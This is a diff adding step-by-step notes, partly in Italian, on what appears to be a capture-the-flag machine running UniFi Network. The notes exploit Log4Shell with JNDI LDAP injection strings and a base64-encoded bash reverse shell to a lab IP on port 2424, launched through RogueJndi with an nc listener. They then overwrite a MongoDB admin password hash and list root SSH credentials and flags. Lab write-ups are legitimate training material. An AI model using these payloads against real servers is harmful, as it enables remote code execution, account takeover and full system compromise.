@@ -1,0 +1,58 @@
+1. guardare nmap
+2. aprire il sito sulla 8080 e vedere versione di UniFi
+3. cercare CVE per UniFi Network versione 6.4.54
+            
+        https://censys.com/cve-2021-44228-log4j/
+
+4. test if log4j is vulnerable through:
+
+        ${jndi:ldap://10.10.16.46/etc/passwd}
+
+5. encode the shell payload in base 64
+
+echo 'bash -c bash -i >&/dev/tcp/10.10.16.27/2424 0>&1' | base64
+
+-> result is:           YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjcvMjQyNCAwPiYxCg==
+
+
+
+6. start the app with the command (downloaded app from github)
+
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMjcvMjQyNCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.16.27"
+
+
+7. open listener on the same port:
+
+nc -lvp 2424
+
+8. send payload to the server:
+
+${jndi:ldap://10.10.16.46:1389/o=tomcat}
+
+9. wait for response, then upgrade the shell:
+
+script /dev/null -c bash
+
+10. ps aux | grep mongo -> mongo db on port 27117  
+
+11. enumeration of admin accounts
+
+12. generation of a new admin password
+mkpasswd -m sha-512 Password1234
+
+13. password substitution
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$d3dXTGplLy6hQCSH$hNbtBZNbrIDcu4/NEhFXrr5EWXLAyP9INRlC9zxaUw.f0Q6ekkoRoItNd5lfp838eCMIA5J6tWtWdVjAdH2pK/"}})'
+
+14.
+access to the site:
+SSH CREDENTIALS:
+root
+NotACrackablePassword4U2022
+
+
+user key
+6ced1a6a89e666c0620cdb10262ba127
+
+root key
+e50bc93c75b634e4b272d2f771c33681
